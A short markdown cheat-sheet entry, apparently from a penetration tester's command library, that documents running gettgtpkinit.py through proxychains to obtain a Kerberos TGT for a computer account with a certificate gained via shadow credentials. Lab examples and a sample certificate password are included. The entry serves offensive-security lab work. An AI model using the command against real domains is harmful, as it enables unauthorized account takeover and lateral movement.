---
type: command
executor: bash
data: >-
  proxychains python3 gettgtpkinit.py $_DOMAIN/$_COMPUTER$ $_CCACHE_FILE
  -cert-pfx $_CERT_PFX_PATH -pfx-pass $_PFX_PASSWORD
tags:
  - pkinit
  - kerberos
  - tgt
platforms:
  - Linux
verified: true
validated: true
---

# gettgtpkinit-using-certificate

## Command

```bash
proxychains python3 gettgtpkinit.py $_DOMAIN/$_COMPUTER$ $_CCACHE_FILE -cert-pfx $_CERT_PFX_PATH -pfx-pass $_PFX_PASSWORD
```

## Description

Requests a Kerberos TGT for a computer account using a PKINIT certificate obtained via shadow credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain (e.g., ez.lab) | Yes |
| $_COMPUTER$ | Computer account (e.g., ws2$) | Yes |
| $_CCACHE_FILE | Output ccache file (e.g., ws2.ccache) | Yes |
| -cert-pfx | Path to .pfx certificate (e.g., /opt/impacket/examples/T12uyM5x.pfx) | Yes |
| -pfx-pass | Certificate password | Yes |
| proxychains | Proxy if needed | No |

## Examples

### Basic Usage

```bash
proxychains python3 gettgtpkinit.py ez.lab/ws2$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
```

### Advanced Usage

```bash
proxychains python3 gettgtpkinit.py ez.lab/ws2$ ws2.ccache -cert-pfx cert.pfx -pfx-pass pass -k
```

## Expected Output

Using principal: ws2$@EZ.LAB
Kerberos TGT saved to ws2.ccache

## Related

- [[procedures/Workstation-Takeover-with-RBCD]]
- [[tools/Impacket]]
